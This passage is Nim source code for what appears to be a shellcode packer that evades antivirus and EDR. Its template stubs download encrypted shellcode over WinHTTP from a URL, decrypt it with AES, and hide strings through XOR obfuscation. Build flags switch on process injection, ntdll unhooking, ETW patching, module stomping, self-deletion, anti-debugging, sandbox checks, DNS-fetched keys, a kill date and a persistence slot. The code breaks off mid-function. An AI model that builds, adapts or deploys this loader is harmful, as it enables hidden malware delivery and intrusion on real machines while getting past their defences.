  UpdateServiceStatus(SERVICE_RUNNING)
  ##  #####################################
  ##  your persistence code here
  ##  #####################################
  discard main(nil)
  while (serviceStatus.dwCurrentState != SERVICE_STOP_PENDING):
    WaitForSingleObject(stopEvent, INFINITE)
    UpdateServiceStatus(SERVICE_STOPPED)
    return

proc ServiceMain*(dwArgc: DWORD, lpszArgv: ptr LPTSTR): VOID {.stdcall,exportc, dynlib.} =
    NimMain() # otherwise garbage collector and other stuff won't have initialized.
    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME,
                                                     cast[LPHANDLER_FUNCTION](ServiceHandler))
    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS
    serviceStatus.dwServiceSpecificExitCode = 0
    UpdateServiceStatus(SERVICE_START_PENDING)
    ExecuteServiceCode()

"""

let ServiceStub * = """

#
#
#               nimWindowsService
#        (c) Copyright 2018 David Krause
#
#    See the file "LICENSE.txt", included in this
#    distribution, for details about the copyright.
#
## the service code
## a windows service needs to register its main function in the Service control manager
## and also report its status!

# https://docs.microsoft.com/en-us/windows/desktop/api/winsvc/nf-winsvc-controlservice

type ServiceMain = proc(gSvcStatus: SERVICE_STATUS)

var SERVICE_NAME =  "SERVICE_NAME2_BAA".LPTSTR
var gSvcStatusHandle: SERVICE_STATUS_HANDLE
var gSvcStatus: SERVICE_STATUS 

proc reportSvcStatus*(dwCurrentState, dwWin32ExitCode, dwWaitHint: DWORD) =
    var dwCheckPoint: DWORD = 1 # TODO what is this? 
    gSvcStatus.dwCurrentState = dwCurrentState
    gSvcStatus.dwWin32ExitCode = dwWin32ExitCode
    gSvcStatus.dwWaitHint = dwWaitHint
    if dwCurrentState == SERVICE_START_PENDING:
        gSvcStatus.dwControlsAccepted = 0
    else:
        gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP

    if dwCurrentState == SERVICE_RUNNING or dwCurrentState == SERVICE_STOPPED:
        gSvcStatus.dwCheckPoint = 0
    else:
        gSvcStatus.dwCheckPoint = dwCheckPoint
        dwCheckPoint.inc()
    
    # Report the status of the service to the SCM.
    echo "SetServiceStatus: " & $SetServiceStatus(gSvcStatusHandle, addr gSvcStatus)

proc svcCtrlHandler(dwCtrl: DWORD) {.stdcall.} =
    ## Handle the requested control code. 
    case dwCtrl
    of SERVICE_CONTROL_STOP:
        # Signal the service to stop 
        # TODO we must stop OUR code somehow!
        reportSvcStatus(SERVICE_STOP_PENDING, NO_ERROR, 10_000) # we think we can stop the service in 10 seconds
    of SERVICE_CONTROL_INTERROGATE:
        discard
    else:
        discard

template wrapServiceMain*(mainProc: ServiceMain): LPSERVICE_MAIN_FUNCTION = 
    ## wraps a nim proc in a LPSERVICE_MAIN_FUNCTION
    proc serviceMainFunction(dwArgc: DWORD, lpszArgv: ptr LPTSTR) {.stdcall.} =
        gSvcStatusHandle = RegisterServiceCtrlHandler(
            SERVICE_NAME,
            svcCtrlHandler
        )
        gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS
        gSvcStatus.dwServiceSpecificExitCode = 0
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)   
        mainProc(gSvcStatus) # call the wrapped proc
        reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!
    serviceMainFunction


when isMainModule:
    import times, os
    proc serviceMain(gSvcStatus: SERVICE_STATUS) =
        ## a service main
        ## use gScvStatus to check if we should stop periodically!
        #reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        discard main(nil)
        #var onlyOnce: bool = true
        #sleep(5000)
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        #sleep(5000)
        while gSvcStatus.dwCurrentState != SERVICE_STOP_PENDING:
            sleep(1000)
        #[    reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
            if(onlyOnce):
                onlyOnce = false
                discard main(nil)
        ]#
        #reportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0) # we have to report back when we stopped!

    var wrapped = wrapServiceMain(serviceMain)
    var dispatchTable = [
        # SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: SvcMain),
        SERVICE_TABLE_ENTRY(lpServiceName: SERVICE_NAME, lpServiceProc: wrapped),
        SERVICE_TABLE_ENTRY(lpServiceName: nil, lpServiceProc: nil) # last entry must be nil
    ]

    echo StartServiceCtrlDispatcher( (addr dispatchTable[0]).LPSERVICE_TABLE_ENTRY)
    while gSvcStatus.dwCurrentState == SERVICE_RUNNING:
        reportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0)
        sleep(1000)


"""

let ShellcodeFromURLStub * = fmt"""

    #[
        References:
            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_winhttp.c
            - https://github.com/rapid7/metasploit-payloads/blob/9ebb095a0acf95c4e55e62d44a57f7da740f1b16/c/meterpreter/source/metsrv/server_transport_wininet.c
            - https://gist.github.com/henkman/2e7a4dcf4822bc0029d7d2af731da5c5
    ]#


    proc httpRequestException(msg: string) =
        raise newException(ValueError, "Error when performing HTTP request: " & $msg)

    proc safeStringSlice(n: LPCWSTR, l: DWORD): LPCWSTR =
        var
            nim_string = $n
            nim_int = l-1

        return nim_string[0..nim_int]

    proc httpGetRequest(url: string): string =
        var
            bits: URL_COMPONENTS
            flags: DWORD
            hSession, hConnect, hReq: HINTERNET
            ieConfig: WINHTTP_CURRENT_USER_IE_PROXY_CONFIG
            proxyInfo: WINHTTP_PROXY_INFO
            dwSize, dwDownloaded: DWORD = 0
            pszOutBuffer: LPSTR
            bResults: bool
            totalDownloaded: int
            dataBuffer: StringStream = newStringStream("")

        when defined(ssl):
            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE or WINHTTP_FLAG_SECURE
        else:
            flags = WINHTTP_FLAG_BYPASS_PROXY_CACHE

        when defined(verbose):
            echo obf("+ Attempting HTTP GET request to: ") & url

        hSession = WinHttpOpen(obf("PackRequest"), WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
        if hSession.isNil:
            when defined(verbose):
                httpRequestException(obf("Creating hSession returned an error: ") & $GetLastError())

        zeroMem(addr bits, sizeof(bits))
        bits.dwStructSize = cast[DWORD](sizeof(bits))

        bits.dwSchemeLength    = -1
        bits.dwHostNameLength  = -1
        bits.dwUrlPathLength   = -1
        bits.dwExtraInfoLength = -1

        WinHttpCrackUrl(url, 0, 0, addr bits)
        var actual_hostname = safeStringSlice(bits.lpszHostName, bits.dwHostNameLength)
        var actual_scheme = safeStringSlice(bits.lpszScheme, bits.dwSchemeLength)
        when defined(verbose):
            echo obf("* [HTTP] Scheme: "), actual_scheme
            echo obf("* [HTTP] Hostname: "), actual_hostname
            echo obf("* [HTTP] URL Path: "), bits.lpszUrlPath

        if not hSession.isNil:
            hConnect = WinHttpConnect(hSession, actual_hostname, bits.nPort, 0)

        if not hConnect.isNil:
            hReq = WinHttpOpenRequest(hConnect, "GET", bits.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)

        if WinHttpGetIEProxyConfigForCurrentUser(addr ieConfig):
            when defined(verbose):
                echo obf("* [PROXY] Got IE Configuration")
                echo obf("* [PROXY] Autodetect: "), ieConfig.fAutoDetect
                echo obf("* [PROXY] Auto URL: "), $ieConfig.lpszAutoConfigUrl
                echo obf("* [PROXY] Proxy: "), $ieConfig.lpszProxy
                echo obf("* [PROXY] Proxy Bypass: "), $ieConfig.lpszProxyBypass

            if (not ieConfig.lpszAutoConfigUrl.isNil or ieConfig.fAutoDetect.bool):
                var autoProxyOpts: WINHTTP_AUTOPROXY_OPTIONS

                if ieConfig.fAutoDetect:
                    when defined(verbose):
                        echo obf("* [PROXY] IE config set to autodetect with DNS or DHCP")
                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT
                    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP or WINHTTP_AUTO_DETECT_TYPE_DNS_A
                    autoProxyOpts.lpszAutoConfigUrl = NULL

                elif not ieConfig.lpszAutoConfigUrl.isNil:
                    when defined(verbose):
                        echo obf("* [PROXY] IE config set to autodetect with URL "), ieConfig.lpszAutoConfigUrl

                    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL
                    autoProxyOpts.dwAutoDetectFlags = 0
                    autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl

                autoProxyOpts.fAutoLogonIfChallenged = TRUE;

                WinHttpGetProxyForUrl(hSession, bits.lpszUrlPath, addr autoProxyOpts, addr proxyInfo)

            elif not ieConfig.lpszProxy.isNil:
                when defined(verbose):
                    echo obf("* [PROXY] IE config set to proxy "), ieConfig.lpszProxy, obf(" with bypass "), ieConfig.lpszProxyBypass 

                proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY
                proxyInfo.lpszProxy = ieConfig.lpszProxy
                proxyInfo.lpszProxyBypass = ieConfig.lpszProxyBypass

                ieConfig.lpszProxy = NULL
                ieConfig.lpszProxyBypass = NULL

        WinHttpSetOption(hReq, WINHTTP_OPTION_PROXY, addr proxyInfo, cast[DWORD](sizeof(WINHTTP_PROXY_INFO)))

        if not hReq.isNil:
            bResults = WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)

        if bResults:
            bResults = WinHttpReceiveResponse(hReq, NULL)

        if bResults:
            while true:
                if not WinHttpQueryDataAvailable(hReq, addr dwSize).bool:
                    httpRequestException("Error in WinHttpQueryDataAvalable: " & $GetLastError())

                if dwSize == 0:
                    break

                pszOutBuffer = newString(dwSize+1)
                zeroMem(pszOutBuffer, dwSize+1)

                if not WinHttpReadData(hReq, addr pszOutBuffer[0], dwSize, addr dwDownloaded).bool:
                    httpRequestException("Error receiving data: " & $GetLastError())

                dataBuffer.writeData(addr pszOutBuffer[0], dwDownloaded)
                totalDownloaded += dwDownloaded

            when defined(verbose):
                echo obf("+ Total data received: "), totalDownloaded

            WinHttpCloseHandle(hReq)
            WinHttpCloseHandle(hConnect)
            WinHttpCloseHandle(hSession)

            dataBuffer.setPosition(0)
            return dataBuffer.readAll()

    var encString = httpGetRequest(obf("{shellcodeURL}"))
    var enctext: seq[byte] = toByteSeq(encstring)
    var dectext = newSeq[byte](len(enctext))
    

"""


let Cryptstub1 = """
import winim/lean
#import std/algorithm
import strformat
from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import strutils
import ptr_math
when defined(ruylopez):
    import dynlib
    type
        typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                        MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                        FileHandle: HANDLE): NTSTATUS {.stdcall.}

    type
        MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}


    type
        HookedNtCreate* {.bycopy.} = object
            origNtCreate*: typeNtCreateSection
            ntCreateStub*: array[24, BYTE]

        HookTrampolineBuffers* {.bycopy.} = object
            originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
            originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
            previousBytes*: HANDLE
            previousBytesSize*: DWORD

# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
#from winim/lean import FARPROC,NtClose,VirtualAllocEx,NT_SUCCESS
#import winim/winstr
#import winim/utils
#from winim import winstr,winimbase,windef
when defined(stomb):
    import cfgadd
when defined(DInvoke):
    from packerutils import MyRtlGetCurrentPeb
when defined(AntiDebug):
    from winim import LIST_ENTRY,PVOID,ULONG,UNICODE_STRING,UCHAR,BYTE,P_PEB

when defined(ProviderPatch):
    from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames

when defined(HardwareETW):
  from winim/clr import load,clrVariantToString,new,`.`,VT_BSTR,invoke,clrStart

when defined(csharp):
    from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR,clrVariantToString,new,clrStart
    from os import paramCount,paramStr

when defined(localinject):
    when defined(ruylopez):
        from os import paramCount,paramStr

when defined(sleep):
    import random
    import times

when defined(threadless):
    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle

when defined(AllocateDripStyle):
    import Utils

when defined(stomb):
    from Utils import GetRemoteProcAddress, GetRemoteModuleHandle
    var module: HMODULE

when defined(SelfDelete):
    # Don't want to import the everything from winim, only what's really needed
    from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
    from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE
    template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
    template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = moveMemory(Destination, Source, Length)

when defined http:
    import winim/inc/winhttp
    import streams
when defined ssl:
    import winim/inc/winhttp
    import streams

when defined(Hellsgate):
    from os import paramStr
    {.passC:"-masm=intel".}
    from winlean import getCurrentProcess

when defined(localinject):
    when defined(ruylopez):
        from os import getAppFilename,getCurrentDir
        from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
        from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
        import dynlib

when defined(remoteinject):
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
    import osproc,os

when defined(JmpEntry):
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS

when defined(COMVARETW):
    import osproc,os
    from winim import PROCESSENTRY32,PROCESSENTRY32A,Process32NextA,Process32FirstA,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS
    from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA

when defined(HardwareETW):
    from winim import CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,TH32CS_SNAPTHREAD,THREADENTRY32,Thread32First,Thread32Next

when not defined(proxy):
    when defined(notcloned):
        import nimstrenc
when defined(Fluctuate):
    import Fluctuation


# We use a custom memCopy/copyMem function here, which takes two pointers and a size as input and copies the seccond pointer content into the first
proc moveMemory(dest: pointer, src: pointer, size: int) =
    var csrc: ptr char = cast[ptr char](src)
    var cdest: ptr char = cast[ptr char](dest)
    for i in 0 ..< size:
        cdest[i] = csrc[i]

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  moveMemory(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    var whatup: char
    var testString : string = " "
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            whatup = result[i]
            testString = testString & " "
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xEE))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFEE

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFEE
    else:
        result = s

when defined(dnsKey):
    from winim import PDNS_RECORD,DNS_RECORD,DNS_STATUS,DNS_QUERY_STANDARD,DNS_TYPE_TEXT,DnsQueryW
    var envkey,envkey2: string
    #proc DnsQueryW*(pszName: LPCWSTR, wType: WORD, Options: DWORD, pExtra: PVOID, ppQueryResults: PVOID, pReserved: PVOID): DWORD {.importc, dynlib: obf("dnsapi.dll"), stdcall, discardable.}
when not defined(DInvoke):
    proc LdrLoadDll*(PathToFile: PWCHAR, Flags: ULONG, ModuleFileName: PUNICODE_STRING, ModuleHandle: PHANDLE): NTSTATUS {.
        importc: obf("LdrLoadDll"), dynlib: obf("ntdll"), stdcall, discardable.}
    proc RtlAddVectoredExceptionHandler*(FirstHandler: ULONG, VectoredHandler: PVOID): PVOID {.
        importc: obf("RtlAddVectoredExceptionHandler"), dynlib: obf("ntdll"), stdcall, discardable.}

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc calcHard *(): int =
    var rand: int = 0
    for i in 0 .. 10:
        rand += 15
        if ((rand mod 9) != 0):
            rand += 15
    return rand

# we need our custom lstrlenW function here, as otherwise the compiler throws errors when going without dynlib
proc lstrlenW*(lpString: PWCHAR): int =
    var i = 0
    while lpString[i] != 0:
        inc(i)
    return i

when defined(macPayload):
    proc RtlEthernetStringToAddressA*(str: PCSTR, terminator: ptr PCSTR, targetaddr: DWORD_PTR): NTSTATUS {.importc, dynlib: "ntdll.dll".}

when defined(QueueAPC):
    when not defined(Hellsgate):
        type
            KNORMAL_ROUTINE* {.pure.} = object
                NormalContext*: PVOID
                SystemArgument1*: PVOID
                SystemArgument2*: PVOID
            PKNORMAL_ROUTINE* = ptr KNORMAL_ROUTINE


# Check, if OS is Windows Server 2012, as that is different with ntdll.dll on disk and memory
var ws2k12: BOOL = 0


proc `$`(a: array[128, WCHAR]): string = $cast[WideCString](unsafeAddr a[0])

proc rtlGetVersion(lpVersionInformation: var OSVersionInfoExW): NTSTATUS
    {.cdecl, importc: obf("RtlGetVersion"), dynlib: obf("ntdll.dll").}

var versionInfo: OSVersionInfoExW
discard rtlGetVersion(versionInfo)
#echo versionInfo

if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 2):
    ws2k12 = 1
    when defined verbose:
        echo obf("Windows Server 2012/Win8 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 3):
    ws2k12 = 1
    when defined verbose:
        echo ("Windows Server 2012 R2/Win8 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 0):
    ws2k12 = 1
    when defined verbose:
        echo obf("Windows Server 2008/Win7 detected\n")
if(versionInfo.dwMajorVersion == 6 and versionInfo.dwMinorVersion == 1):
    ws2k12 = 1
    when defined verbose:
        echo ("Windows Server 2008 R2/Win7 detected\n")

if(versionInfo.dwMajorVersion <= 5):
    ws2k12 = 1
    when defined verbose:
        echo ("XP/Server 2003 or old as fuck system detected, may have troubles here! \n")


when defined(logFile):
    # a function that logs the input string (or multiple strings) into C:\temp\log.txt
    proc logVerbose(inputString: string): void =
        var file = open("C:\\temp\\log.txt", fmAppend)
        file.writeLine(inputString)
        file.close()

"""


let killdateStub = """


proc checkDate() =
  var killdate = obf("KILLDATEREPLACE")  # yyyymmdd format
  var now: SYSTEMTIME
  GetLocalTime(addr now)
  var date = fmt"{now.wYear}{now.wMonth:02}{now.wDay:02}"  # yyyymmdd format
  echo date
  echo killdate
  if date >= killdate:
    # MessageBoxA(0, cast[LPCSTR](cstring("This program has expired!")), cast[LPCSTR](cstring("Error")), MB_OK)
    quit(1)
  # else:
    # MessageBoxA(0, cast[LPCSTR](cstring("This program is still valid!")), cast[LPCSTR](cstring("Success")), MB_OK)

checkDate()

"""

let macPayloadStub = fmt"""


{macPayloadString}

var rowLen: int = len(mac)
var Terminator: PCSTR
var STATUS: NTSTATUS
var alloc_mem: LPVOID

if((len(mac)*6) > 4200):
    # use the Stack, as on the HEAP we get a crash for large Shellcode
    alloc_mem = VirtualAlloc(cast[ptr uint8](nil), (len(mac)*6), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)    
else:
    # use the HEAP, that is less monitored by AV/EDR and nearly not hooked
    var hHeap: HANDLE = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)
    alloc_mem = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 0x1000)

var directPointer: LPVOID = cast[LPVOID](alloc_mem)

when defined(verbose):
    echo obf("[*] MAC addresses to memory data conversion...")

for i in 0 ..< rowLen:
    STATUS = RtlEthernetStringToAddressA(mac[i], &Terminator, cast[DWORD_PTR](directPointer))
    if STATUS == STATUS_SUCCESS:
        directPointer += 6
    else:
        when defined(verbose):
            echo obf("Failed with Error Code: "), toHex(STATUS)

"""

let Cryptstub15 = fmt"""

when defined(Stego):
    import streams

    proc nthBitPresent(b: byte,n: int): bool =
        var a = 1 shl n
        var b = int(b) and a
        return b != 0

    proc extractByte(a: seq[bool]): byte =

        var b: byte = 0
        for i in 0 .. 7:
            if a[i]:
                b = b or (byte)(1 shl (7 - i))
            else:
                b = b or (byte)(0 shl (7 - i))
        return b

    proc extractBytes(a: seq[byte],b: int): seq[byte] =
        
        var c: int = b

        var d: seq[bool] = newSeq[bool](0)
        for i in c .. len(a) - 1:
            d.add(nthBitPresent(a[i], 0))
        var e: seq[byte] = newseq[byte](0)

        for i in countup(0, len(d), 8):
            if len(d) - i > 8:
                var tmp : byte = extractByte(d[i .. i + 8])
                e.add(tmp)
        e = e[1 .. (e.len - 1)]
        var f = toByteSeq("\t")[0]
        var idx = e.find(f);
        var payloadLengthBytes: seq[byte] = e[0 .. idx - 1]
        var p: int
        var msg_len = (cast[ptr int32] (addr payloadLengthBytes[p]))[]
        var finalPayload = e[idx+1 .. (idx + msg_len)]
        return finalPayload

    proc getBytesFromFile(path: string): seq[byte] =
        try:
            var
                s = newFileStream(path, fmRead)
                valSeq = newSeq[byte]()
            while not s.atEnd:
                let element = s.readUInt8
                valSeq.add(element)
            s.close()
            return valSeq
        except:
            echo "!! ", path, " was not found !!"
            quit(1)

    proc mergeBaseImageWithPayload1BitPerByte(my_byte: byte, ends_in_one: bool): byte =
        var new_byte: byte = my_byte;
        if ends_in_one:
            if not nthBitPresent(my_byte, 0):
                new_byte = cast[byte](my_byte + 1)
        else:
            if (nthBitPresent(my_byte, 0)):
                new_byte = cast[byte](my_byte - 1)
        return new_byte;

    proc getFromStegano(path: string): seq[byte] =
        var 
            c = getBytesFromFile(path)
            a = 50
            shellcode: seq[byte] = extractBytes(c, a)
        return shellcode


# alternative to disable CFG https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/

var cfgspawn: bool = false

when defined(threadless):
    const threadlessDLL = obf("{threadlessDll}") 
    const threadlessFunction = obf("{threadlessFunc}")
    cfgspawn = true

when defined(stomb):
    const DLLPATH: cstring = obf("{stombDll}")
    var stombDll = obf("{stombDll}")
    var stombFunc = obf("{stombFunc}")
    var rPtr2: LPVOID
    cfgspawn = true
    when defined(carokann):
        var stombFunc2 = obf("{stombFunc2}")

when defined(unhook):
    var dllNames: seq[string] = {dllNames}
    
when defined(carokann):
    var originalscLength: DWORD = {originalScLength}

when defined(AllocateDripStyle):
    var dripsleepinbetween = {dripsleepinbetween}

when defined(JmpEntry):
    var jmpMod: string = obf("{jmpEntryDLL}")
    var jmpFunc: string = obf("{jmpEntryFunction}")

when defined(noKey):
    when defined(keyFromFile):
        # read key from file (keyFile)
        var keyFileHandle: File
        var keyString: string
        for f in {keyFile}:
            try:
                keyFileHandle = open(f, fmRead)
                keyString = keyFileHandle.readAll()
                when defined(verbose):
                    echo obf("[*] Key file found: ") & f
                break
            except:
                when defined(verbose):
                    echo obf("[-] Failed to open file: ") & f
        if keyString.len == 0:
            when defined(verbose):
                echo obf("[-] Key file is empty or not found!")
            quit(1)
        when defined(verbose):
            echo obf("[*] Key: ") & keyString
        var envkey = keyString
        var envkey2 = envkey
    when defined(dnsKey):
        # retrieve key from a domain TXT record via dns request using DnsQuery Win32 API. The domain is dnsdomain
        var dnsdomain: string = obf("{dnsdomain}")
        var recordType: WORD = 0x0010 # DNS_TYPE_TEXT
        var pDnsRecord: PDNS_RECORD = nil

        var dnsStatus: DNS_STATUS = DnsQueryW(dnsdomain, recordType, DNS_QUERY_STANDARD, nil, addr pDnsRecord, nil)
        if dnsStatus != 0:
            when defined(verbose):
                echo obf("[-] DnsQueryW failed with error code: ") & $dnsStatus
            quit(1)
        else:
            when defined(verbose):
                echo obf("[*] DnsQueryW successful")
        
        while(pDnsRecord != nil):
            if pDnsRecord.wType == DNS_TYPE_TEXT:
                var dnsKey: string = $pDnsRecord.Data.TXT.pStringArray[0]
                when defined(verbose):
                    echo obf("[*] Key: ") & dnsKey
                envkey = dnsKey
                envkey2 = envkey
                break
            else:
                when defined(verbose):
                    echo obf("[-] No TXT record found for domain: ") & dnsdomain
            pDnsRecord = pDnsRecord.pNext
        if pDnsRecord == nil:
            when defined(verbose):
                echo obf("[-] No TXT record found for domain: ") & dnsdomain
        echo ""
    when defined(webKey):
        # Todo: Implement Web Key
        var testVar = 1
    when defined(environmentalKey):
        var envkey: string = ""
        var envkey2: string = ""
else:
    when defined(SkipDefaultSandBoxChecks):
        when defined(AntiDebug):
            when defined(customKey):
                var envkey = obf("{envkey}")
            else:
                var envkey = obf("{firstwithoutlast4}")
            var envkey2 = envkey
        else:
            var envkey = obf("{envkey}")
            var envkey2 = obf("{envkey}")
    else:
        when defined(customKey):
                var envkey = obf("{envkey}")
        else:
            var envkey = obf("{firstwithoutlast4}")
        var envkey2 = envkey
var ptrEncText: ptr byte
var ptrDecText: ptr byte

when defined(Stego):
    when defined(verbose):
        echo obf("[*] Stego mode enabled...")
        echo obf("[*] Extracting payload from stegofile...")
    var encstring: string = toString(getFromStegano("{stegofile}"))
    when defined(verbose):
        echo obf("[*] Payload length: "), len(encstring)
    var enctext: seq[byte] = toByteSeq(encstring)
    var dectext = newSeq[byte](len(enctext))


when defined(PayloadEmbedded):
    when defined(macPayload):
        var enctext = newSeq[byte](len(mac)*(6))
        var dectext = newSeq[byte](len(mac)*(6))
        if ((len(enctext) mod aes256.sizeBlock) != 0):
            when defined(verbose):
                echo obf("[*] Payload length not a multiple of the BlockSize: "), aes256.sizeBlock
                echo obf("[*] Length: ") & $len(enctext)
                echo obf("[*] Padding payload...")
            enctext = enctext & newSeq[byte](aes256.sizeBlock - (len(enctext) mod aes256.sizeBlock))
            dectext = dectext & newSeq[byte](aes256.sizeBlock - (len(dectext) mod aes256.sizeBlock))
            when defined(verbose):
                echo obf("[*] New Length: ") & $len(enctext)
        # Move the encrypted Shellcode into the enctext sequence
        moveMem(addr enctext[0], alloc_mem, len(enctext))
    else:
        when not defined(Stego):
            const encstring = slurp"enc.blob"
            var enctext: seq[byte] = toByteSeq(encstring)
            var dectext = newSeq[byte](len(enctext))
"""

let Cryptstub2 = fmt"""
    var dctx: ECB[aes256]
    var success: BOOL
    when defined(sleepinbetween):
        var sleepbetweentime: int = {sleepinbetween}
    discard calcHard()
    var key: array[aes256.sizeKey, byte]
    discard calcHard()

"""

let Cryptstub3 = fmt"""
    #var envkey2 = envkey & "{lastfour}"
    
    proc decryptLate(): void =
        #envkey2 = reverse(envkey2)
        var expandedkey = toByteSeq(toHex(envkey2))
        when defined(verbose):
            echo obf("[*] Hex key: ") & cast[string](toHex(envkey))
            echo obf("[*] Expanded Hex key: ") & repr(expandedkey)
        
        #expandedkey = toOpenArray(expandedkey).reverse()
        discard calcHard()
        if ((int(len(expandedkey)) mod int(aes256.sizeBlock * 2)) != 0):
            when defined(verbose):
                echo "[*] Key length not a multiple of KeySize: ", aes256.sizeBlock
                echo "[*] Length: " & $len(expandedkey)
                echo "[*] Padding Key with null bytes"
            expandedkey = expandedkey & newSeq[byte]((aes256.sizeBlock * 2) - (len(expandedkey) mod (aes256.sizeBlock * 2)))
            # Length cannot be > 32 bytes
            if (len(expandedkey) > (aes256.sizeBlock * 2)):
